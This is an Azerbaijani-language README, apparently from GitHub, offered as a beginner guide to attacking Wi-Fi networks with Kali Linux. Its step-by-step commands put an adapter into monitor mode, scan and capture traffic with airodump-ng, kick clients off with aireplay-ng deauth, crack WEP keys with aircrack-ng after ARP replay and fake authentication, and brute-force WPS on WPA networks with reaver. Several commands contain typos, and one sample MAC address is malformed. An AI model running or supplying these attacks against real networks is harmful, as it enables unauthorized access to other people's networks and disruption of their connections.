# Kali-Linux-Network-Attacks-Azerbaijani-starter-guide
This is short guide to start or revise network attacks via kali linux software tools. Fully in Azerbaijani language. AZE BKU



_Monitor mode-ə keçmə:_

1. İfconfig komandası vasitəsilə wlan0 adapterini söndür:

**Ifconfig wlan0 down**

2. Iwconfig komadası vasitəsilə wlan0 adapterini monitor mode-ə keçir:

**Iwcofig wlan0 mode monitor**

3. Ifconfig komadası vasitəsilə wlan0 adapterini yandır:

**İfconfig wlan0 up**

_YOXLAMAQ ÜÇÜN:_

Terminala iwconfig komandasını yazdıqda **Mode** yazısından sonra **Monitor** yazılmalıdır.

![](https://raw.githubusercontent.com/ulvial1ev/Kali-Linux-Network-Attacks-Azerbaijani-starter-guide/main/Picture1.png)


_Wifilar__ı scan eləmək üçün:_

1. Adapterin(wlan0) monitor mode-də olduğuna əmin olun.
2. Airodump-ng komandası vasitəsilə wlan0 adapteri ilə scan-a başlayın:

**Airodump-ng wlan0**

3. Qabağınıza belə bir siyahı çıxacaq:

![](https://raw.githubusercontent.com/ulvial1ev/Kali-Linux-Network-Attacks-Azerbaijani-starter-guide/main/Picture2.png)

**BSSID**** :** bssid göstərilmiş Wifi-ın MAC adressidir(ətraflı scan etdikdə istədiyimiz wifi-ın MAC adressini göstərməliyik)

**PWR**** :** PWR göstərilmiş Wifi-ın gücüdür( nə qədər ədəd böyükdür, o qədər potensial bağlantı güclüdür)

**#DATA**** :** #data Wifi-ın hal hazırda nə qədər paket qəbul etməsinin göstəricisidir.

Əgər Wifi hal hazırda işlənirsə( insanlar tərəfindən) onda bu data göstəricisi tez-tez artacaq.Əgər göstərici 0-da qalıbsa və ya çox gec artırsa Wifi-dan hal-hazırda istifadə etmirlər.

**CH**** :** CH Wifi-ın neçənci kanalda işlədiyini göstərir(ətraflı scanda Wifi-ın işlədiyi kanalı qeyd etməliyik)

**ENC**** :** ENC Wifi-ın növüdür, ən populyar növlər WEP, WPA, WPA2 -dir.

Bunlardan ən asan qırılan WEP-dir. Çünki köhnə kodlaşdırma növündən istifadə edilir.(client-dən routerə gedən paketlər eyni IV ilə kodlaşdırıldığına görə)

_Ətraflı scan:_

1. Scan etdikdən sonra ətraflı scan etmək istədiyiniz Wifi-ın **BSSID və CH** müəyyən edin.
2. Airodump-ng komandasından istifadə etməklə scan etmək istədiyiniz Wifi-ın bssid-ni, ch-nı bir komandada yazmaqla terminala verin:

**Airodump-ng --bssid \<Wifi-ın bssid-si\> --channel \<Wifi-ın CH-i\> --write \<istədiyiniz Wifi-in scanın nəticələrini yadda saxlayan faylın adı\> wlan0**

Komandaya hər hansı bir opsiya əlavə eləmək üçün - və ya – istifadə olunur

(Məsələn: --bssid)

**Komandaya misal:**

_ **Airodump-ng –bssid 30:C5:A6:E7:G8:AA –channel 2 –** __ **write test\_scan wlan0** _

3. Qabağınıza belə bir şey çıxacaq:


![](https://raw.githubusercontent.com/ulvial1ev/Kali-Linux-Network-Attacks-Azerbaijani-starter-guide/main/Picture3.png)

**STATION**** :** STATION istifadəçinin(client) BSSID-sidir.

_Ətraflı scandan sonra scanın nəticələri olduğunuz directorydə yadda saxlanılacaq(məndə root idi)_

Bu scandan biz paketlər aldıq. İndi isə həmin paketləri decrypt eləmək olar..

P.s: bu paketlərdə yalnız istifadəçinin device-ın markası göstəriləcək( Samsung, Apple, Xiaomi və s.).Digər məlumatlar kodlaşdırılıb.

_Wireshark vasitəsilə decrypt eləmək üçün:_

1. Terminalda Wireshark yazırıq.
2. Açılan proqramda yuxarı sol küncdə "Open" basırıq.
3. Açılmış Explorerdə yadda saxladığımız faylın .cap uzantısı ilə olanı seçirik.
4. Və paketlərin Decrypti açılacaq.

![](https://raw.githubusercontent.com/ulvial1ev/Kali-Linux-Network-Attacks-Azerbaijani-starter-guide/main/Picture4.png)

5. Gördüyümüz kimi paketlərdən bildik ki, istifadəçilərdən biri Apple işlədir, digəri isə Xiaomi(router də ola bilər). Az olsa da artıq bir qədər informasiya var.

_**Deauth(istifadəçi qovulması) attack eləmək üçün:**_

1.Deauth attack STATION-lara edilir.Deauth attack etdiyimiz device-in MAC adressini öyrənməliyik.Bunun üçün ətraflı scan etməliyik. Ətraflı scan etdikdən sonra

2.Aireplay-ng komandası vasitəsilə **--deauth** yazırıq.Deauth yazdıqdan sonra göndərilən paketlərin sayını yazırıq. **-a** vasitəsilə routerin(access point) MAC adressini yazırıq. **-c** vasitəsilə isə deauth edəcəyimiz device-ın MAC adressini yazırıq. Axırda isə adapterin göstəricisini yazırıq( wlan0 )

_ **Aireplay-ng --deauth** _ _ **\<Paketl** __**ərin sayı**__ **\> -a \<r** __**outer MAC**__ **\> -c \<device MAC\> wlan0** _

_ **WEP tipli wifi-lar** __ **ın parolunu hack eləmək üçün:** _

1. WEP tipli qoşulmaları qırmaq üçün həmin qoşulmadan keçən çoxlu paketlər almalıyıq. Wifi işlədilən zaman biz ətraflı scan etməliyik(fayl yadda saxlamaq şərti ilə)
2. Aircrack-ng komandası vasitəsilə faylın adını( .cap uzantısı ilə ) yazırıq.

**Aircrack-ng test\_01.cap**

![](https://raw.githubusercontent.com/ulvial1ev/Kali-Linux-Network-Attacks-Azerbaijani-starter-guide/main/Picture5.png)

**KEY FOUND** yazısından sonraki MAC adressə oxşayan yazı elə paroldur.

_**Əgər aktiv paketlər yoxdusa özümüz yaradırıq: (arp replay)**_

_ **Aireplay-ng --arpreplay -b \<wifi bssid\> -h \<adapter bssid\> wlan0** _

_**Fakeauth attack( fake doğrulama- istifadəçinin qoşulması):**_

_ **Aireplay-ng --fakeauth 0 -a \<wifi bssid\> -h \<adapter bssid\> wlan0** _

_ **WPA/WPA 2 çalış fluxion işlət, amma bəxtin gətirsə, əgər WİFİ-da WPS varsa rahat qırmaq olar.** _

1. _**wash --interface wlan0 (wps olanlar**__**ı yoxlamaq üçün)**_
2. _ **fakeatuh 30** _
3. _ **./** __**reaver --bssid** _ _ **\<Wifi** _ _ **bssid**__ **\> --channel \<Kanal\> --interface wlan0 -vvv --no-associate(k**__**öhnə versiyasa istifadə edir, problem yaransa "—no-associate" komandasını sil)**_
